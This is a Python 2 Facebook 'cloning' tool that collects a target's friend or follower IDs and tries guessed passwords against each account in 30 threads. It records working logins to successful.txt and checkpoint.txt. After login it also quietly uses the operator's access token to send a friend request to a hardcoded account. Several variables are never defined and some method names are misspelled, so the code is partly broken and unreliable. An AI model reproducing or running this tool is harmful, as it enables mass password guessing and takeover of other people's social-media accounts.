#!/usr/bin/python2
#coding=utf-8
#ALI-XP OFFICAL PROGRAMMER 
#FB CLONING COMMMAD MAKER 


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
    print '\x1b[1;96m[!] \x1b[1;91mExit'
    os.sys.exit()


def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.05)

#### colours ####
B='\033[1;94m'
R='\033[1;91m'
G='\033[1;92m'
W='\033[1;97m'
S='\033[1;96m'
P='\033[1;95m'
Y='\033[1;93m'

#Dev:ALI-XP
#### LOGO ####
logo = """

\033[1;97m          :::     :::        ::::::::::: 
\033[1;97m       :+: :+:   :+:            :+:      
\033[1;97m     +:+   +:+  +:+            +:+       
\033[1;97m   +#++:++#++: +#+            +#+        
\033[1;97m  +#+     +#+ +#+            +#+         
\033[1;97m #+#     #+# #+#            #+#          
\033[1;97m###     ### ########## ###########       

           
     \x1b[0;37;41m \xe2\x9a\xa1 XIDI-PAKISTANI \xe2\x9a\xa1\x1b[1;31;40m       
                            
\033[1;92m════════════════════════════════════════════
\033[1;92m(!)\033[1;97m Author   : XP-TEAM
\033[1;92m(!)\033[1;97m Github   : ALI-XP
\033[1;92m(!)\033[1;97m Youtube  : XIDI PAKISTANI
\033[1;92m(!)\033[1;97m Facebook  : Muhammad  Arshad
\033[1;92m════════════════════════════════════════════
"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print """


\033[1;97m      :::    ::: ::::::::::: ::::::::: ::::::::::: 
\033[1;97m     :+:    :+:     :+:     :+:    :+:    :+:      
\033[1;97m     +:+  +:+      +:+     +:+    +:+    +:+       
\033[1;97m     +#++:+       +#+     +#+    +:+    +#+        
\033[1;97m   +#+  +#+      +#+     +#+    +#+    +#+         
\033[1;97m #+#    #+#     #+#     #+#    #+#    #+#          
\033[1;97m###    ### ########### ######### ###########       

                                             
      \x1b[0;37;41m \xe2\x9a\xa1 ALI-XP \xe2\x9a\xa1\x1b[1;31;40m 
                               
\033[1;92m════════════════════════════════════════════
\033[1;97m      \033[1;97m ENTER TOOL USERNAME AND PASSWORD 
\033[1;92m════════════════════════════════════════════
"""

CorrectUsername = "ALI"
CorrectPassword = "XP"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;97m[✎] \x1b[0;36m Enter Tool User: \033[1;97m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;97m[✎] \x1b[0;36m Enter Tool Pass: \033[1;97m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username  #DEV ALI-XP
            loop = 'false'
        else:
            print "Wrong password!"
            os.system('xdg-open https://m.youtube.com/channel/UCgeDQh57SpuvWGDVXgFojAg')
    else:
        print "Wrong username!"
        os.system('xdg-open https://m.youtube.com/channel/UCgeDQh57SpuvWGDVXgFojAg')

##### LICENSE #####
#=================#
def lisensi():
	os.system('clear')
	login()
####login#########
def login():
	os.system('clear')
	print logo
	print("\033[1;97m[2] Login With Access Token")
	print("\033[1;97m[3] Download Access Token APP")
	print("\033[1;97m[4] Contact With Owner")
	print("\033[1;97m[0] Direct Exit")
	pilih_login()

def pilih_login():
	peak = raw_input("\n\033[1;97m[!] Choose ---> ")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_login()
	elif peak =="1":
		login1()
        elif peak =="2":
	        tokenz()
        elif peak =="3":
	        os.system('xdg-open https://play.google.com/store/apps/details?id=com.proit.thaison.getaccesstokenfacebook')
	        login()
	elif peak =="4":
		os.system('xdg-open https://www.facebook.com/XIDI001')
		login()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()
			
		
	
def login1():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
                time.sleep(0.05)
		print logo
		id = raw_input("\033[1;97m[!] \033[1;94mId/mail/no: ")
		pwd = raw_input("\033[1;97m[!] \033[1;94mPassword : ")
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[1;97mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				jalan( '\n\x1b[1;95mLogin Successful...') 
				os.system('xdg-open https://m.youtube.com/channel/UCgeDQh57SpuvWGDVXgFojAg')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[1;97mThere is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\x1b[1;97mYour Account is on Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\x1b[1;93mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()

def tokenz():
	os.system('clear')
	print logo
	toket = raw_input("\033[1;97m[!] Put Token : \033[1;92m")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		print("\033[1;92mToken login success")
		menu()
	except KeyError:
		print "\033[1;91m[!] Wrong"
		time.sleep(1.7)
		login()
		
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		o = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(o.text)
		nama = a['name']
		id = a['id']
                t = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
                b = json.loads(t.text)
                sub = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print"\033[1;97mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;94mThere is no internet connection"
		keluar()
	os.system("clear")
	print logo
	print "  \033[1;92m Logged User\033[1;92m: "+nama+"  	   \033[1;92m"
	print("")
	print("\033[1;97m [1] Clone Friendlist And Public ID")
	print("\033[1;97m [2] Clone With Auto Password")
	print("\033[1;97m [3] Update Tool")
	print("\033[1;97m [0] Logout Commands")
	print("\033[1;92m════════════════════════════════════════════")
	pilih()


def pilih():
	unikers = raw_input("\n[!] Choose : ")
	if unikers =="":
		print "\x1b[1;91mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="2":
	    choose()
	elif unikers =="3":
		os.system('clear')
		print logo
		print("\033[1;92m════════════════════════════════════════════")
		os.system('git pull origin master')
		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
		menu()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()

def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print("[1] Crack With Public ID/Link")
	print("[2] Crack With Followers ID/Links")
	print("[0] Direct Back")
	pilih_super()

def pilih_super():
	select = raw_input("[!] Choose option: ")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		print logo
		idt = raw_input("[!] Put ID/Username : ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			q = json.loads(r.text)
			os.system('clear')
			print logo
			print("[!] Target User : "+q["name"])
		except KeyError:
			print("")
			print("\033[1;91mInvalid Link Or Friendlist Has Privact").center(50)
			print("")
			time.sleep(3)
			super()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+nm)
	elif select =="2":
		os.system("clear")
		print logo
		idt = raw_input("[!] Put ID/Username : ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			q = json.loads(r.text)
			os.system("clear")
			print logo
			print("[!] Target User : "+q["name"])
		except KeyError:
			print("\tInvalid id link")
			print("")
			raw_input(" Press enter to back")
			super()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+toket+"&limit=999999")
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+nm)
	elif select =="0":
	    menu()
	else:
		print("")
		print("\033[1;91mPlease Select A Valid Option").center(50)
		print("")
		time.sleep(3)
		crack_select()
	print("[!] Total User IDs :\033[1;92m "+str(len(id)))
	time.sleep(0.05)
	print("[!]\033[1;95m Cracking Start...")
	time.sleep(0.05)
	print("[!]\033[1;97m Plz wait clone account will be appear here\033[1;92m")
	time.sleep(0.05)
	print("\033[1;92m════════════════════════════════════════════")

	def main(arg):
		user=arg
		uid,name=user.split("|")
		try:
			data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass1, headers=header).text
			q = json.loads(data)
			if "loc" in q:
				print("\033[1;95m[OK] \033[1;96m"+uid+" | "+pass1+"\033[0;97m")
				ok = open("successful.txt", "a")
				ok.write(uid+" | "+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in q["error"]:
					print("\033[1;91m[CP] "+uid+" | "+pass1+"\033[0;97m")
					cp = open("checkpoint.txt","a")
					cp.write(uid+" | "+pass1+"\n")
					cp.close()
					cps.append(uid+pass1)
				else:
					data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass2, headers=header).text
					q = json.loads(data)
					if "loc" in q:
						print("\033[1;95m[OK] \033[1;96m"+uid+" | "+pass2+"\033[0;97m")
						ok = open("successful.txt", "a")
						ok.write(uid+" | "+pass2+"\n")
						ok.close()
						oks.append(uid+pass2)
					else:
						if "www.facebook.com" in q["error"]:
							print("\033[1;91m[CP] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("checkpoint.txt","a")
							cp.write(uid+" | "+pass2+"\n")
							cp.close()
							cps.append(uid+pass2)
						else:
							data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass3, headers=header).text
							q = json.loads(data)
							if "loc" in q:
								print("\033[1;95m[OK] \033[1;96m"+uid+" | "+pass3+"\033[0;97m")
								ok = open("successful.txt", "a")
								ok.write(uid+" | "+pass3+"\n")
								ok.close()
								oks.append(uid+pass3)
							else:
								if "www.facebook.com" in q["error"]:
									print("\033[1;91m[CP] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("checkpoint.txt","a")
									cp.write(uid+" | "+pass3+"\n")
									cp.close()
									cps.append(uid+pass3)
								else:
									data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass4, headers=header).text
									q = json.loads(data)
									if "loc" in q:
										print("\033[1;95m[OK] \033[1;96m"+uid+" | "+pass4+"\033[0;97m")
										ok = open("successful.txt", "a")
										ok.write(uid+" | "+pass4+"\n")
										ok.close()
										oks.append(uid+pass4)
									else:
										if "www.facebook.com" in q["error"]:
											print(" \033[1;91m[CP] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("checkpoint.txt","a")
											cp.write(uid+" | "+pass4+"\n")
											cp.close()
											cps.apppend(uid+pass4)
									        else:
									                data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass5, headers=header).text
									                q = json.loads(data)
									                if "loc" in q:
										                print("\033[1;95m[OK] \033[1;96m"+uid+" | "+pass5+"\033[0;97m")
										                ok = open("successful.txt", "a")
										                ok.write(uid+" | "+pass5+"\n")
										                ok.close()
										                oks.append(uid+pass5)
									                else:
										                if "www.facebook.com" in q["error"]:
											                print(" \033[1;91m[CP] "+uid+" | "+pass5+"\033[0;97m")
											                cp = open("checkpoint.txt","a")
											                cp.write(uid+" | "+pass5+"\n")
											                cp.close()
											                cps.apppend(uid+pass5)
																												   	
											                               
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;92m════════════════════════════════════════════" 
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;96m[+] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/checkpoint.txt")
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	menu()

if __name__ == '__main__':
	login()
